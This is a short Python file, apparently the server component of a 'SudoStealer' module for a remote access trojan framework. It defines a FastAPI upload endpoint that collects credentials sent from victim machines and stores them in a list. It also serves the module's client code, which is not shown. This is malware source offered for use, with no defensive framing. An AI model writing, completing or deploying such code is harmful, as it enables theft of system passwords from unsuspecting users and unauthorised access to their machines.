from fastapi import APIRouter, Request
from modules.rat_module import RatModule

class SudoStealer(RatModule):
	name = "sudostealer"
	router = APIRouter()
	credentials: list[str] = []

	@router.get("/upload")
	async def upload_creds(self, request: Request):
		text = await request.body()
		self.credentials.append(text)
	
	def get_client_code() -> str:
		with open(__file__.removesuffix("server.py")+"client.py", 'r') as f:
			return f.read()